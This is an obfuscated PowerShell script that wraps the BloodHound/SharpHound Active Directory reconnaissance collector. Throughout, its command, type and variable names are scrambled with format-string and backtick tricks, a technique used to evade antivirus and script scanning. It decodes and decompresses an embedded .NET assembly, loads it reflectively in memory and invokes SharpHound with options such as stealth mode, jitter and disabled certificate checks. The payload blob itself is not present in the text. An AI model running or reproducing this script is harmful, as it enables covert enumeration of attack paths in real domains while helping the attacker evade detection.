  ${bCa`E7}=  [TyPE]("{0}{1}" -F'cOnVE','RT');  &("{0}{1}"-f'SET-I','TEm') ("VA"+"r"+"i"+"abLE:X"+"mKB")  (  [TYpe]("{0}{4}{3}{6}{5}{2}{1}{8}{7}" -F'I','.co','n','R','O.comP','iO','EsS','RESSIOnMoDE','Mp')  ) ;    ${1J`3US}  =  [tYPE]("{1}{0}{4}{2}{3}" -f'leCti','REF','ssEM','BLY','On.a')  ; function InVok`E`-bLOOdh`O`U`Nd
{
    

    [CmdletBinding(pOSitiOnALbiNdinG = ${fA`l`Se})]
    param(
        [Alias("c")]
        [String[]]
        ${co`LlEcT`IonmET`hods} = [String[]]@(("{0}{2}{1}" -f'Def','t','aul')),

        [Alias("d")]
        [String]
        ${doMa`In},
        
        [Alias("s")]
        [Switch]
        ${s`EarC`HforEst},

        [Switch]
        ${ST`EaLTH},

        [String]
        ${l`DA`PFIlter},

        [String]
        ${D`Is`TingUIsh`EDN`A`Me},

        [String]
        ${c`OmputE`Rf`I`lE},

        [ValidateScript({ &("{0}{1}{2}"-f'Test','-Pat','h') -Path ${_} })]
        [String]
        ${o`UtPu`TdIr`e`CTo`RY} = $( &("{1}{0}{2}"-f'-Loca','Get','tion') ),

        [ValidateNotNullOrEmpty()]
        [String]
        ${ouTP`UT`prE`F`IX},

        [String]
        ${c`AchE`NAme},

        [Switch]
        ${mEMcA`che},

        [Switch]
        ${RE`Bui`LD`caCHE},

        [Switch]
        ${RA`NDo`mf`ILeN`AmES},

        [String]
        ${zIpfI`Le`NaMe},
        
        [Switch]
        ${noZ`iP},
        
        [String]
        ${zi`PpaSSwo`Rd},
        
        [Switch]
        ${t`RAc`KCO`MP`UtErCallS},
        
        [Switch]
        ${PRETt`Y`Print},

        [String]
        ${Ld`A`PusE`RNamE},

        [String]
        ${LD`AppA`SS`wOrD},

        [string]
        ${DO`M`AINconT`RoLLEr},

        [ValidateRange(0, 65535)]
        [Int]
        ${LDAp`P`oRt},

        [Switch]
        ${SecUr`Eld`Ap},
        
        [Switch]
        ${d`ISab`le`C`eRtVeriFIcATiON},

        [Switch]
        ${diSa`Ble`SiGn`ING},

        [Switch]
        ${SkipP`OR`T`check},

        [ValidateRange(50, 5000)]
        [Int]
        ${pORt`CHeC`k`T`ImE`ouT} = 500,

        [Switch]
        ${sKI`P`PASswO`RdC`hecK},

        [Switch]
        ${e`XClUDE`dCS},

        [Int]
        ${t`hRO`TTlE},

        [ValidateRange(0, 100)]
        [Int]
        ${ji`Tt`ER},

        [Int]
        ${T`hrEA`DS},

        [Switch]
        ${SKiP`R`EGIStR`yloGGeDON},

        [String]
        ${OVeR`Rid`Euse`RnaMe},

        [String]
        ${Re`AlDns`N`Ame},

        [Switch]
        ${ColleCTa`lL`PR`OpE`Rti`eS},

        [Switch]
        ${lO`Op},

        [String]
        ${Lo`O`PDURA`T`iON},

        [String]
        ${L`oOpi`NtervAL},

        [ValidateRange(500, 60000)]
        [Int]
        ${st`Atus`int`ErvaL},
        
        [Alias("v")]
        [ValidateRange(0, 5)]
        [Int]
        ${VeRB`O`Sity},

        [Alias("h")]
        [Switch]
        ${hE`LP},

        [Switch]
        ${VErsi`ON}
    )

    ${vA`RS} = &("{2}{1}{0}"-f 'ect','-Obj','New') ("{10}{4}{5}{1}{2}{11}{7}{9}{8}{3}{6}{0}"-f 't]','i','o','stem.','.Collec','t','Objec','s','List[Sy','.Generic.','System','n')
    
    if(!(${p`sbOu`NdpA`RaMet`ers}.("{2}{1}{3}{0}" -f'sKey','n','Co','tain').Invoke(("{1}{0}" -f 'lp','he')) -or ${Psb`O`UnDPA`R`AMEteRS}.("{2}{0}{1}" -f'i','nsKey','Conta').Invoke(("{1}{0}{2}" -f 'er','v','sion')))){
        ${psBOUnDP`A`RaMEt`ERS}."K`EyS" | &('%') {
            if (${_} -notmatch ("{2}{0}{1}" -f'e','rbosity','v')){
                ${vA`RS}.("{1}{0}" -f'dd','a').Invoke("--$_")
                if(${p`SbO`UndP`ARAM`EteRS}.("{1}{0}"-f 'm','ite').Invoke(${_}).("{1}{0}"-f 'type','get').Invoke()."Na`ME" -notmatch ("{2}{1}{0}" -f'h','witc','s')){
                    ${Va`RS}.("{1}{0}" -f'd','ad').Invoke(${ps`BOUNdpA`RA`m`ET`eRS}.("{0}{1}"-f 'i','tem').Invoke(${_}))
                }
            }
            elseif (${_} -match ("{0}{1}"-f 'verbosi','ty')) {
                ${vA`RS}.("{0}{1}" -f'a','dd').Invoke("-v")
                ${V`Ars}.("{0}{1}" -f'ad','d').Invoke(${P`SB`OunDP`Aram`ETe`Rs}.("{1}{0}"-f 'em','it').Invoke(${_}))
            }
        }
    }
    else {
        ${pSbOU`NdP`ARa`meT`E`Rs}."K`eyS" |&('?') {${_} -match ("{0}{1}"-f'hel','p') -or ${_} -match ("{1}{0}" -f'rsion','ve')}| &('%') {
            ${VA`Rs}.("{1}{0}" -f 'dd','a').Invoke("--$_")
        }
    }
    
    ${p`ASSED} = [string[]]${v`ArS}.("{1}{0}" -f'Array','To').Invoke()

	${dE`Fl`ATedSTr`Eam} = &("{1}{0}{2}" -f 'w-Objec','Ne','t') ("{6}{5}{1}{4}{3}{2}{0}" -f 'm','ion.D','rea','flateSt','e','.Compress','IO')([IO.MemoryStream]  (&("{1}{0}{2}" -f'rIAb','vA','Le') ("bcA"+"E7")).VALUE::("{3}{1}{0}{2}{4}"-f '64','omBase','Stri','Fr','ng').Invoke(${EnCO`DEDCOmP`R`e`sse`D`FiLE}), ( &("{0}{1}"-f'i','teM') ("Va"+"R"+"I"+"aBLe:X"+"Mkb")  ).VAlue::"dE`co`m`pReSS")
	${U`NCom`prES`s`eDFIlebY`TeS} = &("{0}{1}{2}"-f'Ne','w-O','bject') ("{0}{2}{1}"-f'By','e[]','t')(1046528)
	${defL`A`Ted`Str`Eam}.("{1}{0}" -f 'ad','Re').Invoke(${UNcO`M`PRessEd`File`BytES}, 0, 1046528) | &("{0}{2}{1}"-f 'Out-N','ll','u')
	${A`sSEmb`lY} =  (  &("{0}{2}{1}"-f'G','tEm','eT-i') VaRiABLe:1J3US ).VALue::("{1}{0}" -f 'd','Loa').Invoke(${u`N`c`OM`PRESsed`FILeByTEs})
	${bI`NdI`NGF`lagS} = [Reflection.BindingFlags] ("{0}{3}{1}{4}{2}" -f'Publ',',S','ic','ic','tat')
	${A} = @()
	${a`SSe`MBly}.("{1}{2}{0}"-f 'pe','GetT','y').Invoke(("{5}{4}{0}{1}{3}{2}{6}" -f'a.Ass','e','lyLoa','mb','r','Costu','der'), ${FaL`Se}).("{0}{1}{2}"-f 'GetM','et','hod').Invoke(("{0}{1}"-f 'At','tach'), ${bI`NDiN`GFlAgS})."iNv`OKe"(${n`ULL}, @())
	${aSs`EM`Bly}.("{0}{1}{2}" -f'GetT','y','pe').Invoke(("{0}{3}{2}{1}" -f 'Sh','ram','g','arphound.Pro')).("{1}{2}{0}" -f'ethod','G','etM').Invoke(("{3}{1}{0}{2}"-f'a','h','rpHound','InvokeS'))."iN`VO`KE"(${n`ULl}, @(,${P`ASsED}))
}